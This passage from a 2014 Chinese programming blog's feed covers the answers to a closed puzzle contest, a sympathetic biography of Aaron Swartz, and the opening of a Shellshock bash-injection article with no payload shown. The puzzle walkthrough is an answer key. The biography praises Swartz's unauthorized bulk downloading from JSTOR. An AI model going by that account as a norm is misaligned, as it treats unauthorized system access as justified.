<p style="text-align: left; padding-left: 30px;">3）我使用了英文，只希望你对英文不要害怕，英文是程序员最关键的一项技能。（虽然我的英文也一般）</p>
<p style="text-align: left; padding-left: 30px;">4）你要通关的话，你可能需要很多的Google/Wikipedia，所以，你可能需要翻墙环境。我希望你能经常翻墙。</p>
<p style="text-align: left; padding-left: 30px;">5）另外，如果要通关的话，你需除了有比较好的观察能力，你还需要对Linux命令行有一些了解，有一半左右的题是需要写代码才能过的，写代码的题中有字符串匹配（正则表达式），网络请求，算法和数据结构，以及一些基础的加密解密知识。</p>
<p style="text-align: left; padding-left: 30px;">6）这些题并不难，而且谜面提示得应该是非常清楚，不过，你要做完最快也需要2-3个小时，所以，在这里还是谢谢你的时间。</p>
<p style="text-align: left;">祝大家玩得愉快！</p>
<p style="text-align: center;"><strong>————更新：2014/8/5————</strong></p>
<p style="text-align: center;"><span style="color: #cc0000;"><strong>本活动已结果，题的页面还在保留中……</strong></span></p>
<p style="text-align: left;">（全文完）</p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-08-03T18:52:14+08:00</pubDate>
<guid>https://coolshell.cn/articles/11832.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 谜题的答案和活动的心得体会 ]]></title>
<link>https://coolshell.cn/articles/11847.html</link>
<content><![CDATA[ 
<p>我于2014年8月3日周六的上午在微博、twitter、CoolShell上发布了一个和程序员有关的解谜题的活动——<a title="【活动】解迷题送礼物" href="https://coolshell.cn/articles/11832.html" target="_blank">【活动】解谜题送礼物</a>。我使用了二级域名fun.coolshell.cn做为这次活动的页面。</p>
<p><img alt="image placeholder" ></p>
<p>截止这篇文章发布的时候，fun.coolshell.cn的访问量UV大约有4万左右，通关人数大约有200人，但因为在活动的第二天网上就出了一些答题攻略，通过分析，实际靠自己能力通过的人数在130人左右。通过率大约不到4‰的样子。</p>
<p>在这里我把整个谜题和做这个活动的东西写一下，算是给自己的一个总结。</p>
<h4>谜题的答案和花絮</h4>
<p>fun.coolshell.cn上一共有十道谜题，<strong>要设计这些东西还真是费尽脑汁，这让我对那些设计谜题式游戏的人相当敬佩</strong>。</p>
<p><span id="more-11847"></span></p>
<p style="padding-left: 30px;"><strong>第0关：</strong>很多人可能一头雾水，完全不知道这是什么，其实只要Google一下，你会知道这是一个叫BrainFuck的语言。在Coolshell.cn上我也介绍了过——《<a title="BT雷人的程序语言" href="https://coolshell.cn/articles/1142.html" target="_blank">BT雷人的程序语言</a>》《<a title="BT雷人的程序语言（大全）" href="https://coolshell.cn/articles/4458.html" target="_blank">BT雷人的程序语言（大全）</a>》，要通过这关，你需要把那段程序编译一下。要编译这段程序其实很简单，Google一个在线的编译器就可以了。（关于其它更多的古怪的编程语言请参看这里：<a href="https://esolangs.org/wiki/Language_list" target="_blank">http://esolangs.org/wiki/Language_list</a>）</p>
<p style="padding-left: 30px;"><strong>第1关：</strong>这一关也是很简单的，你需要在网页上找到两个数，一个是X，一个是Y，然后求得X和Y的乘积。对于X，你可以观察一下那个数列游戏，对于Y，你可以Google一下就知道了（我在Coolshell的《<a title="如何用最有创造力的方式输出42" href="https://coolshell.cn/articles/11170.html" target="_blank">如何用最有创造力的方式输出42</a>》说过这个事）。</p>
<p style="padding-left: 30px;"><strong>第2关：</strong>上面显示了一个不一样的键盘，我给了这个键盘的Wikipedia的链接。这个键盘叫Dvorak键，不同于我们的Qwert键。通过这个两个键盘的布局映射，你可以把下面那段读不懂的文字解出来（其实，你还是可以Google，有在线的转换）。把下面那段文字转成Qwert键的，你就会发现这是一段代码，这段代码非常著名，<span style="color: #000000;">是1987年国际<a href="http://www.di-mgt.com.au/src/korn_ioccc.txt" target="_blank">C语言混乱大赛一等奖的一段代码</a>（你可Google “IOCCC 87 unix”）。（关于IOCCC你可以参看Coolshell之前的《<a title="6个变态的C语言Hello World程序" href="https://coolshell.cn/articles/914.html" target="_blank">6个变态的HelloWorld</a>》、《<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html" target="_blank">如何混乱代码</a>》、《<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">如何写出无法维护的代码</a>》这几篇文章）</span></p>
<p style="padding-left: 30px;"><strong>第3关：</strong>扫描二维码以后，你会得到一个码表转换，你可以使用Shell的tr命令来转一下下面的话。转完后你就可以读懂了，读懂了你还需要使用rot13来转一下“shell”（Google一下，你会发现也有在线的转换器，另外还有其它的rot）</p>
<p style="padding-left: 30px;"><strong>第4关</strong>：这是众多同学被卡在的地方。很多同学吐槽这题太坑了，别忘了这是游戏啊。我问了几个早先通关的同学，他们都说还好了，只要静一下心来多观察一下，你就会找出规律的。这个回文的模式是，一个大写字符和一个数字（顺序不限）把一个小字母套起来。于是，写成正则表达式是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">([A-Z])([0-9])[a-z]\2\1|([0-9])([A-Z])[a-z]\4\3</code></p>
<p style="padding-left: 30px;">用shell命令可以很快地找到9个匹配，然后，像“cat”一样，取中间的小写字母组成一个单词。写成Shell命令是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">grep -o "\([A-Z]\)\([0-9]\)[a-z]\2\1\|\([0-9]\)\([A-Z]\)[a-z]\4\3" cat.txt | sed -E "s/(.)(.)(.)\2\1/\3/g" | awk '{printf("%s",$1)}' &amp;&amp; echo ""</code></p>
<p style="padding-left: 30px;">这题主要考的是你的观察能力和正则表达式。</p>
<p style="padding-left: 30px;"><strong>第5关</strong>：如果你点了一下图片后，你就知道，这个连接http://fun.coolshell.cn/n/2014返回了一个数字，如果你把这个数字放到那个URL中，不断地替换其中的数字，你会得到一个新的数字。于是你就会得到最终的答案。</p>
<p style="padding-left: 30px;">这道题本来我是想让大家写程序的，我原来设置了一共512个序列，但是考虑到服务受不了，所以，我把它降到了128个，这样保证你的程序可以在几秒钟内得到结果，而不会对我的服务器造成压力。但是我还是看到好几个同学人肉地copy+paste+回车刷了100多下，得到了最终答案。</p>
<p style="padding-left: 30px;"><strong>第6关：</strong>通过中序和后序遍历还原一棵二叉树，然后再找到其最深的路径，然后得到一个字符串后，把这个字符串做为一个passcode代入那个openssl的命令行中。你就可以解密密文得到下一关的答案。</p>
<p style="padding-left: 30px;">这个题，我本想设计得更隐晦一些，用一个“心脏流血”的图片来暗示openssl，然后用别的东西暗示AES-128-CBC，后来想想算了，主要还是考大家在大学里的二叉树的最基本的算法。并介绍一下openssl的shell命令行加解密的方法。</p>
<p style="padding-left: 30px;">在网上的一些攻略中我看到了大家没有用程序，而是手动地花了一棵树出来。（其实，这设计这道的时候，我本来想设计成随机树，也就每个人看到的答案都不一样，我随机建树并且找最深路径的程序都写好了，但是我最终还是没有这样做，因为这无疑增加我对这个网页游戏的代码复杂度，而我又没有太多的时间，而谜题的各种形式已经够让我花精力的了，你虽然看到了10道题，但是其实我设计了一共有16道题，我反复斟酌，即不想为难大家，又不想太简单和无聊，所以最终release了这十道题）</p>
<p style="padding-left: 30px;"><strong>第7关：</strong>N皇后问题，这个问题也是大学里的题。9皇后一共有352个解，你需要把这352个解代到那个sha1的公式中（需要上一关用于解密的passcode），这样你就会得到一个解。然后这就是通关口令。</p>
<p style="padding-left: 30px;">第6关和第7关的算法题你要是不会写的话，Google一下，反正我们是“大自然的搬运工”，不是吗？呵呵。</p>
<p style="padding-left: 30px;">第7关这题啊，我看到一个同学用穷举的1-9的排序组合的方式来向服务发请求，从123456789开始，我都看SB了，因为这关的通答案是9开头，我勒了个去！你得对我的服务器发多少次请求啊，才能得到一个200的回复啊。TNND。服了。不过这个同学我最终还是给通过了，没有判定成作弊。</p>
<p style="padding-left: 30px;"><strong>第8关：</strong>Excel的列号编程，这一关写成代码其实并不难的。但我看到网上给的好些答案，大家都是用手算。也OK，这题本身就没有什么难度，但是因为这个26进制是从1开始的，写出来的代码并不非常容易，一些边界条件很容易就break掉了。这题完全考的是编码。把COOLSHELL除以SHELL的数转成字符串。然后就进入最后一关了。</p>
<p style="padding-left: 30px;">然后，我又见到有个同学用了穷举的方式，TNND，其实每道题都有人在用穷举的方式，我勒个去。他从AAA开始穷举，不一会就穷举出正确答案了。尼玛！</p>
<p style="padding-left: 30px;"><strong>第9关：</strong>一个猪圈和一个共济会的logo，你Google一下，你就知道答案了。这题纯粹就是介绍知识的。不知道大家有没有去wikipedia上了解了一下这个猪圈密码和共济会是怎么一回事吗？这样的密文叫图片密文，还有很多类似的图片密文的。你知道吗？有相应的字库哦。也有在线的生成器哦。（因为我最近在学各种安全的基础知识，所以了解到了这个东西）</p>
<p style="padding-left: 30px;"><strong>通关：</strong>于是你就通关了。你会发现你得到了一个helloworld，这个字符串，在我一放出来这个谜题的时候，就有很多人在尝试helloworld就是那段brainfuck的代码的输出。我汗啊。还好我做了一个比较复杂的防作弊检查……</p>
<p>总体来说，这些关卡都不难，但是你最少也得用2-3个小时。<a href="http://fun.coolshell.cn/top100.html" target="_blank">Top100页面</a>时统计的平均时间是10个半小时。</p>
<p>再说一个花絮，自从，8月3日上线后，8月4日在网上就有了相关的解答攻略，还是在V2EX上，于是出现了好些只花了几分钟就做完了的人。不过好在事先我就预料到了这个事，事先预备好了“反作弊分析”的脚本，细节不想说太多，反正就是说，我会记录你答案的整个过程和行为，以此来确保TOP100中的人基本都是用自己能力答的，当然，可能会有漏判，但至少也是写过代码的。</p>
<h4>活动心得</h4>
<p>因为是第一次做活动，所以有很多感想，下面写下一些做这个活动的心得，供大家参考：</p>
<p><strong>1）要做好一个这样的解题游戏并不简单</strong>。</p>
<ul>
<li>
<strong>关卡设计：</strong>最花力气的地方就是设计每个关卡，我不能设计得太过隐晦，也不能设计得太过明显。最好是要符合参与者的能力，但又要高于平均以上水平的能力，最好在90%以上。这样会让大家有挑战感，但是又不会有挫败感。这个度相当难把握。总体而言，本次设计的谜题中还有很多可以改进的地方。但这毕竟是我的第一次，也算是我用其来感受一下应该怎么设计游戏。</li>
</ul>
<ul>
<li>
<strong>游戏黏性：</strong>除了设计谜题，还需要针对用户可能会答错的地方来给用户一些提示，原因也是为了不让用户有挫败感，虽然用户没有答对，但是需要用这些页面来鼓励用户You made some progress，这个很重要。这会让用户对游戏更有粘性，并且更愿意有更多的投入。找到这些地方也不是一件容易的事，因为做为游戏的设计者来说，很难从一个不知到答案的角度去思考。所以需要试玩，在fun.coolshell.cn正式release之前，我找了几个人比较聪明的人来试玩了一下，对这个游戏的帮助很大。</li>
</ul>
<ul>
<li>
<strong>游戏管理：</strong>这样的一个在线游戏自然会出一些作弊者，为了游戏的公平性，你需要剔除这些作弊者。所以，我设计了一些比较简单的记录用户所有过程的监测的算法。通过cookie和后台的http log来一同分析。这个部分也比较地花时间。我上周六的时候写这些代码写到了凌晨4点，导致脑子不清楚，出了些bug，导致在大家游戏过程中重置cookie等伤害用户体验的事件。所以说啊，不能赶啊，也不能加班啊。</li>
</ul>
<p><strong>2）关于怎么做一个活动的感想。</strong></p>
<ul>
<li>
<b>这次活动的背景</b>。首先，想做这个活动的起因是这样的。我一个朋友在微博上做活动——“转发微博或@几个人怎么怎么滴就有机获得什么什么的”，<strong>我在这里把这种活动简称为“转就送”活动</strong>。于是遭到了水军的刷奖品，导致他根本分不清楚哪些是正常人，哪些不是，因为新浪微博上有大量的这要瓣机器人，所以他这次活动最后失败了。我说，你得加点难度啊，要加点智商啊。<strong>而且，我看过太多的活动都是这样的，而且很多公司的活动也是这样的，我觉得太low了</strong>。于是，我就萌生了自己尝试一下的念头。</li>
</ul>
<ul>
<li>
<strong>我对做活动的理解</strong>。我一直觉得网上那些诸如“转就送”或是“抽奖”这样的活动都比较SB，这些人根本就不知道怎么做活动。这样做活动不需要智商，简单粗暴，效果一点也不好，活动做完了，人就走了，人们马上就忘了。我以为做活动的精髓是这样的：</li>
</ul>
<ul>
<ul>
<li>
<strong>真正的价值</strong>。其实，好的活动并不只是物品的价格，而是参与这个过程的感觉和体会。如果你让人觉得这是碰运气的，那么这个活动除了用物品价格来吸引人，也就没别的什么了。<strong>如果这个活动的参与过程是让人有成就感的，要有成就感那么就需要有一定难度的挑战，而且这种挑战也是让众人认可和佩服的，那么这个奖品的价格再小，价值也会很大</strong>。比如：Olympic Game，World Cup之流的，世界顶尖，四年一次，来之不易。这才是活动的价值。本次的fun.coolshell.cn上的活动，我希望让大家在做题的过程中学到一些东西，另外也希望做出来的人有一种成就感。</li>
</ul>
</ul>
<ul>
<ul>
<li>
<strong>让人有回味</strong>。那些简单的“转就送”式的活动不会让人产生任何的回味，只会让人产生很大的反感。就像那些“让你转发，不转就死全家”的东西，相当的让人反感。真正的回味是人们对活动参与过程的讨论和交互。在fun.coolshell.cn上线后，我就看到好几个社区在讨论这些谜题，这就是所谓的回味。<strong>只有人们对过程的回味，对参与的回味，才会让这个活动真正的成功</strong>。</li>
</ul>
</ul>
<ul>
<ul>
<li>
<strong>暴露活动过程</strong>。有挑战的活动，一定要有一个Who’s Who的东西，而且是随时动态更新的可以让大家查询的，这样才会从另一个侧面激发大家的热情。因为fun.coolshell.cn一开始说了只给前十个人送东西，结果在过程中，我发现了就半天时间就差不多满了，那时我在想，如果没有奖品了，剩下的人还会不会玩了？于是我飞快地开发了一个TOP100的排行榜，让大家可以看得到这个过程，虽然前十以后就没有奖品了，但是，能上这TOP100也不错。于是乎，在没有奖品情况下，依然在激发着大家的解题热情。<strong>有竞争总是一件有意思的事情，因为成就感总是来自竞争</strong>。（注：为什么top100中会有“xxxxxx”的用户，因为一开始我用的是用户提交的name，但是后来有人告诉我，这个名字可能是真名，所以，我就改成了weibo或twitter的ID，而xxxxx则是没有留下微博或twitter的）</li>
</ul>
</ul>
<p>最后吐个槽，<strong>我真的觉得那些“纯靠运气的活动”相当的SB，我看到好些公司的运营部门招了多少个所谓的高学历和高能力的人，结果干出来的运营活动的水平，其实，也就是个有小学文化水平的人就可以做的了</strong>。那些“转就送式的”、“抽奖式的”的活动，是个人都会干，根本不需要高学历的人。</p>
<h4>其它</h4>
<p>1）<strong>本次活动中，有一个隐藏关卡，还没有人找出来</strong>。要能达到隐藏关卡，需要完成所有的题目。</p>
<p>2）<strong>活动的通关页是HelloWorld，这意味着——这仅仅是个开始</strong>。</p>
<p>最后感谢大家为这个活动付出的时间！</p>
<p>（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-08-06T07:47:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/11847.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 互联网之子 – Aaron Swartz ]]></title>
<link>https://coolshell.cn/articles/11928.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" > 1986年11月8日，有个叫Aaron Swartz的人在美国芝加哥伊利诺伊州出生。因为他父母创办了一个软件公司，所以，Aaron在3岁的时候就接触到了电脑，然后就着迷了。</p>
<p>我们先通过Aaron Swartz 的青少年时期来看一下他是怎么样的一个天才：</p>
<p style="padding-left: 30px;">12岁的时候Aaron就创建了一个类似于Wikipedia式的网站（那时还没有Wikipedia），13岁的时候，Aaron赢得为年轻人而设，创作教育及协同非商业网站的<a class="new" title="ArsDigita Prize" href="https://en.wikipedia.org/wiki/ArsDigita_Prize">ArsDigita Prize</a>比赛首名。 奖品包括参观麻省理工学院及与网际网路界的知名人士见会。</p>
<p style="padding-left: 30px;">14岁的时候，他就成为了<a href="https://en.wikipedia.org/wiki/RSS">RSS1.0</a>的开发组的一员。（后来，他和 <a title="John Gruber" href="https://en.wikipedia.org/wiki/John_Gruber">John Gruber</a>一起开发了Markdown）</p>
<p style="padding-left: 30px;">15岁的时候，进入W3C的 <a title="Resource Description Framework" href="https://en.wikipedia.org/wiki/Resource_Description_Framework">RDF</a> 核心工作组，并写了RFC3870——这个文档描述了一个新的media type – “<a title="RDF/XML" href="https://en.wikipedia.org/wiki/RDF/XML">RDF/XML</a>“，用于定义互联网上的“<a href="https://en.wikipedia.org/wiki/Semantic_Web" target="_blank">语义网络</a>”</p>
<p style="padding-left: 30px;">17岁进入斯坦福大学，1年半后，18岁的时候因为受不了教条式的教育缀学，并通过Y Combinator公司的夏季创办人计划成立Infogami软件公司，在那里，他设想了一个Wiki平台来实现他的Internet Open Library——一个开放的网络图书馆。并写了著名的web.py 开发框架。但他觉得自己太年轻，还要有一个合伙人，于是Y Combinator建议他和Reddit合并。于是他在19岁的时候成了Reddit的创始人</p>
<p style="padding-left: 30px;">虽然Reddit不挣钱，但是相当火，当他20岁的时候（2006年10月），他们把Reddit卖给了<a class="mw-redirect" title="Condé Nast Publications" href="https://en.wikipedia.org/wiki/Cond%C3%A9_Nast_Publications">Condé Nast出版社</a>，据说挣到了百万美金。然后，他去了这家出版社工作，受不了办公室的那种工作环境，2007年1月离职。</p>
<p>但是，你能想得到这么天才的一个人，于2013年1月11日自杀了么？那年他才26岁。</p>
<p><span id="more-11928"></span></p>
<p>从前面Aaron的经历我们可以看到，他是一个特别喜欢Wiki的人，也是非常喜欢开放的人，但并不喜欢那些有CopyRight的东西，也也不喜欢那些循规蹈矩的东西，他喜欢质疑，他喜欢打破常规，他用生命坚持着互联网真正的开放精神。但是这样一来，必然会和守旧的世界相冲突。</p>
<p>他在YC搞的那个Internet Open Library（互联网开放图书馆）的项目，他就想把那些没有Copyright的书籍和学术期刊放在网上让全世界的人免费查阅。<strong>他就认为固体的图书馆遮蔽了知识的传播，互联网理应成为连接书籍，读者，作者，纸张与思想的最好载体，他非常痛恨任何一家巨型的机构独吞所有书籍的做法。他想把Public Access 变成 Public Domain</strong>。在他的青少年时期，他就在不懈地和一切限制信息自由交换和自由共享的做法做斗争。这是他认为的互联网精神，他同时也觉得这和美国民主自由的宪法的精神是一致的。</p>
<p>其中有一个例子是这样的，美国法院行政办公室有一个叫 <a href="https://en.wikipedia.org/wiki/PACER_(law)" target="_blank">PACER</a>（Public Access to Court Electronic Records） 的政府服务。这个服务会把法庭记录的文件放在网上，如果你要看的话，一页要付费8美分（注意是每页，不是每个文档，美国政府说这只是成本式的收费），这个事他非常不能理解，他觉得这些文件本来就属于公众，没有CopyRight，为什么属于公众的东西还要收费。PACER这个服务每年可以为政府带来1.2亿美金的收入。</p>
<p>于是Aaron在2008年9月4日到20日，他22岁的时候，他用Perl在AWS上写了一个程序，从PACER上下载了270万的文档（2000万页，纽约时报里说他下载大约是总量的20%，但是也有人不到总量的1%）。于是FBI对他调查了两个多月，但最终没有对他起诉。（今天，PACER还在收费，不过你可以使用一个叫<a title="RECAP" href="https://en.wikipedia.org/wiki/RECAP">RECAP</a>的Firefox插件来免费浏览当年Aaron下载的相关的法律文档）</p>
<p>2008年同年，Aaron创建了Watchdog.net –  “the good government site with teeth” 专门用来收集和呈现和政客相关的数据（这个网站访问不到了，不过你可以在<a href="http://www.aaronsw.com/weblog/watchdog" target="_blank">Aaron的blog上看一下他的想法</a>）。然后，他还起草了<i><a href="http://openaccessmanifesto.org/" target="_blank">Guerrilla Open Access Manifesto</a></i>（<a href="http://openaccessmanifesto.org/%E6%B8%B8%E5%87%BB%E9%98%9F%E5%BC%80%E6%94%BE%E8%AE%BF%E9%97%AE%E5%AE%A3%E8%A8%80/" target="_blank">中文版</a>）<i> </i>下面是节选</p>
<blockquote>
<p>信息就是能源。但就像所有能源一样，有些人只想占为己有。世界上所有的科学和文化遗产，已在书籍和期刊上发布了数个世纪，正渐渐地被少数私有的公司数字化并上锁。想要阅读那些有着最著名研究成果的论文？你必须支付给如 Reed Elsevier 这样的出版商大把钱。</p>
<p>…… ……</p>
<p>我们要夺回信息，无论它们被存在何处，制作我们的副本并和全世界分享。我们要取到版权到期的东西并将它们归档，我们要买下秘密的资料库并将它们放到网上。我们要下载科学期刊并将它们上传到文件分享网络。我们要为游击队开放访问而战。</p>
<p>只要全世界有足够多的我们，那就不仅是传达了一个反对知识私有化的强有力信号，我们还将让它成为过去。你愿意和我们一起吗？</p>
<p>亚伦·斯沃茨 (Aaron Swartz) 2008 年 7 月，意大利 Eremo</p>
</blockquote>
<p>Aaron觉得那些对人类有价值的科学和文化遗产属于全人类，美国大学每年会向那些出版学术期刊、论文的机构（比如 ISI，Jstor）支付许可费用，许可费用极高，他觉得这是这个时代的悲剧。于是完美主义的他产生了一种责任感。</p>
<p>2009年，他成立了<a title="Progressive Change Campaign Committee" href="https://en.wikipedia.org/wiki/Progressive_Change_Campaign_Committee">Progressive Change Campaign Committee</a>（进步改变运动委员会），2010年，他又创建了 <a title="Demand Progress" href="https://en.wikipedia.org/wiki/Demand_Progress">Demand Progress</a> （求进会）——利用互联网来组织群众与议会和政府对话。</p>
<p>也因为Aaron并不理解政府和这个时代的这些荒唐的行为，于是他开始学习各种政治上的东西去寻求突破，这让他在2010年到2011年，在哈佛大学Edmond J. Safra研究实验室以Lab Fellow的身份主导到了“制度腐败”课题的研究。也因为这个身份，Aaron在MIT做访问学者的时候有 <a title="JSTOR" href="https://en.wikipedia.org/wiki/JSTOR">JSTOR</a>的帐号可以通过MIT的网络访问大量的学术期刊。</p>
<p>于是，他把他的laptop放到了地下室网络交换机的机房中，直接插上网线，然后全天后地下载那些JSTOR的学术期刊。（他利用了这些学术期刊的URL链接中的规律来下载所有的期刊），一开始JSTOR把他的帐号和IP封了，并报告给了警，美国的国家安全警察找到了那间楼道里的机房，然后让JSTOR不禁止他访问，并在那间机房里安了摄像头，钓鱼执法。然后等Aaron去换硬盘时录好像，2011年1月6日就把他给抓了。</p>
<p>那年Aaron才24岁。2011年7月11日，检查官以通信欺诈、计算机欺诈、非法获得信息，以及破坏被保护的罪名电脑来起诉他。可能会受到35年以上的牢狱之灾。这是相当重的罪名。你能想像得到为什么罪名会这么重吗？</p>
<p>事后，JSTOR发声明，说他们并不想起诉Aaron，起诉Aaron的是政府行为，而MIT方面虽然也放弃起诉，并也发表了相关的说明——保持中立。保持中立让MIT基本上名誉扫地，因为这种保持中立的行为违背于MIT一贯鼓吹的黑客文化，MIT成了千夫之指。</p>
<p>当然，美国政府的检查官坚持以重罪起诉他。当时，放在Aaron前有两条路：1）认罪，承认犯下重罪，35年的判决会变成3个月入狱+1年的居家监禁（不得使用电脑），2）不认罪，那就有可能接受35监禁年的最坏结果。Aaron选择了后者，而他的女友则选择了认罪。他的第一任女友后来非常的悔恨，面对国家机器，个体太渺小了。</p>
<p>在起诉期间，大家是否还记得美国那个臭名昭著的SOPA（ <a title="Stop Online Piracy Act" href="https://en.wikipedia.org/wiki/Stop_Online_Piracy_Act">Stop Online Piracy Act</a>）法案？Aaron通过他的 <a title="Demand Progress" href="https://en.wikipedia.org/wiki/Demand_Progress">Demand Progress</a> 把民众们网聚起来，和政府做斗争，最终导致了整个社会都在反对SOPA，也导致了那些议员纷纷改变自己的想法，并导致了白宫最终放弃了这个法案。这是一次民主的胜利，与Aaron有密切的相关。（相信大家都还记得那时美国各大网站都在反对这个网络审查制度）</p>
<figure id="attachment_11930" aria-describedby="caption-attachment-11930" style="width: 500px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-11930" class="wp-caption-text">斯沃茨在2012年反对禁止网络盗版法案(SOPA)的抗议活动上发言</figcaption></figure>
<p>而在次年2012年9月，政府对Aaron进行了更为严厉的起诉，新加入了另外9条起诉，如果成立，Aaron最多获刑50年外加100万美金的罚款。同样，检察官给出了优惠条件，只要Aaron认罪，那就只起诉他6个月的监禁。Aaron再次拒绝。</p>
<p>看到这里，你觉得下载一些期刊，也没有挣钱，为什么要判他这么重呢？这后面有什么故事呢？这是不是更像是一种政治迫害呢（这段时间，好像这些消息并没有进入中国，我们的大多数人依然在使用百度在墙内活得很滋润，另外，这个事在美国那边的IT 圈闹得很大，但似乎也不见各个IT圈的老大们有没有什么表态）</p>
<p>不过，可以肯定的是，美国政府受够了像阿桑奇这样的人了，而Aaron让美国政府更为害怕在有规模有组织的事，所以一定少不了相关的政治迫害，天下政府一般黑。</p>
<p>之后，2013年1月11日，Aaron自杀了。大家觉得他是因为来自美国政府的长期恐吓的压力和以及长期的抑郁（理想主义者可能都会有或多或少的抑郁证）</p>
<p><strong>这就是Aaron Swartz传奇的一生。他用他的生命捍卫了互联网的开放和自由。</strong></p>
<p><img alt="image placeholder" ></p>
<p>互联网之父，<a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee" target="_blank">Tim Berners-Lee</a>，在2012伦敦奥运会上的网络环节我们都见过这个人。世界上第一个web网站是1991年8月6日在CERN内的NeXT服务器上运行（今天这个网站依然可以访问：<a href="http://info.cern.ch/hypertext/WWW/TheProject.html" target="_blank">链接</a>），Tim并被没有用这个发明挣钱，而是无偿地把WWW的构想和设计推广给了全世界。《时代》周刊评论他的时候用了这样的一条话：“与所有的推动人类进程的发明不同，这是一件纯粹个人的劳动成果”。</p>
<p>而Aaron最崇拜的人就是Tim，Tim也是Aaron的精神导师。</p>
<p>Aaron死了以后，Aaron朋友和合作者，哈佛大学法学院教授Laurence Lessig，回忆说，他当年和仅15岁的Aaron 有过一次谈话。Aaron问他：“您刚才讲到网络审查和管制的这些弊病，那您有没有什么实际的方案来解决这些问题呢？”Lessig有点尴尬地说：“没有。我是个学者，我只负责做研究，解决问题不关我的事儿。”Aaron接着问：“您是个学者，所以解决问题不关你的事儿。那，您作为一个公民，又该如何呢？”</p>
<p>有个男孩叫 Jack Andraka，来自巴尔的摩，14岁，阅读了 Aaron 自杀前推广的JSTOR 的免费学术论文，想出了一种提早检测胰腺癌的方法（一般胰腺癌被查出的时候就是你死的时候。）以此，他成功去了约翰霍普金斯大学做研究。Jack说——</p>
<blockquote><p>“我之所以上了新闻，是因为我们的实验成功了，而这就是为什么 Aaron 做的事有那么重要……这个宇宙中的真理不是只有那些政策制定者曾经弄清楚过的，比如应该限速多少，它还包括那些能让你的孩子，不会因胰腺癌而死的研究。<strong>如果没有访问阅读权，那个能解决你的问题的人，可能就永远找不到答案</strong>。”</p></blockquote>
<p> </p>
<p style="text-align: center;"><strong>强烈推荐纪录片——《<a href="http://www.tudou.com/programs/view/jefojo_-HjQ/" target="_blank">互联网之子</a>》</strong></p>
<p style="text-align: center;"><embed src="http://www.tudou.com/v/jefojo_-HjQ/&amp;bid=05&amp;resourceId=0_05_05_99/v.swf" type="application/x-shockwave-flash" width="750" height="580"></embed></p>
<p> </p>
<p>Aaron说的一句话让我挺有感触的——</p>
<p style="text-align: center;"><strong>相信你应该真的每时每刻都问自己，现在这世界有什么最重要的事是我能参与去做的？</strong></p>
<p style="text-align: center;"><strong>如果你没在做那最重要的事，那又是为什么？</strong></p>
<p> </p>
<p><img alt="image placeholder" ></p>
<p><strong>延伸阅读</strong>：<a title="偷了世界的程序员" href="https://coolshell.cn/articles/3363.html" target="_blank">偷了世界的程序员</a></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-09-08T00:26:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/11928.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ bash代码注入的安全漏洞 ]]></title>
<link>https://coolshell.cn/articles/11973.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >很多人或许对上半年发生的安全问题“心脏流血”（Heartbleed Bug）事件记忆颇深，这两天，又出现了另外一个“毁灭级”的漏洞——Bash软件安全漏洞。这个漏洞由法国GNU/Linux爱好者Stéphane Chazelas所发现。随后，美国电脑紧急应变中心（US-CERT）、红帽以及多家从事安全的公司于周三（北京时间9月24日）发出警告。 关于这个安全漏洞的细节可参看美国政府计算安全的这两个漏洞披露：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">CVE-2014-6271</a> 和 <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169">CVE-2014-7169</a>。</p>
<p>这个漏洞其实是非常经典的“注入式攻击”，也就是可以向 bash注入一段命令，从bash1.14 到4.3都存在这样的漏洞。我们先来看一下这个安全问题的症状。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Shellshock_CVE-2014-6271" title="Shellshock (CVE-2014-6271)">Shellshock (CVE-2014-6271)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#AfterShock_-_CVE-2014-7169_%EF%BC%88%E5%8F%88%E5%8F%ABIncomplete_fix_to_Shellshock%EF%BC%89" title="AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）">AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E5%8E%9F%E7%90%86%E5%92%8C%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82" title="原理和技术细节">原理和技术细节</a><ul class="ez-toc-list-level-5">
